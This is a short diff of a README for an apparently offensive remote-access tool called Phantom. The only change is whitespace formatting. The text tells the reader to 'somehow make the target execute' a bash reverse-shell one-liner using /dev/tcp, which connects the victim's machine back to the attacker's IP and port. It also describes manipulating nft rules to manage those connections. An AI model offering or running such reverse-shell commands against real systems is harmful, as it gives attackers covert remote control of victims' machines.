@@ -40,8 +40,8 @@ modifies the nft ruleset so that it doesn't allow more than one connection from 
 continuously open new bash shells, increasing the footprint of Phantom's actions and putting increasing and uneeded load on the target system.
 It can also undo changes made to the nft ruleset by using the argument -r | -R .
 
-You have to somehow make the target execute this code, so that he connects to the 1st-port:
-bash -c 'bash &>/dev/tcp/ip/1st-port 0>&1 &'
+You have to somehow make the target execute this code, so that he connects to the 1st-port:  
+bash -c 'bash &>/dev/tcp/ip/1st-port 0>&1 &'  
 ip and 1st-port are the ones specified above.
 
 ## Order of execution
